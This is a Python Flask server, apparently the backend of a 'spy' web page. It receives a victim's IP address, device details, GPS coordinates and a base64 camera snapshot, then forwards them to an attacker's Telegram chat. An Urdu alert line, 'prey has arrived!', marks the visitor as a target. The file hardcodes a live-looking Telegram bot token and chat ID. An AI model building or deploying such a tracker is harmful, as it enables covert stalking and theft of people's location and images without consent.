from flask import Flask, request, render_template
import requests
import os
import base64

app = Flask(__name__)

# ====== Telegram Configuration ======
BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
CHAT_ID = "6908281054"  # ← اپنا چیٹ آئی ڈی

# ====== HTML Route ======
@app.route('/')
def index():
    return render_template("spy.html")

# ====== Location + Info + Image Receiver ======
@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = data.get('userAgent')
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    image_data = data.get('image')  # Base64 image string

    message = f"""
👁️ شکار آیا!
🌐 IP Address: {ip}
📱 Device Info: {user_agent}
📍 Location: https://www.google.com/maps?q={latitude},{longitude}
🧠 Raw Data: {data}
"""

    # Send message to Telegram
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(telegram_url, data={'chat_id': CHAT_ID, 'text': message})

    # Send image if exists
    if image_data:
        image_bytes = base64.b64decode(image_data.split(",")[1])
        files = {'photo': ('capture.jpg', image_bytes)}
        photo_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        requests.post(photo_url, data={'chat_id': CHAT_ID}, files=files)

    return "OK", 200

# ====== Run on Render or Local ======
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
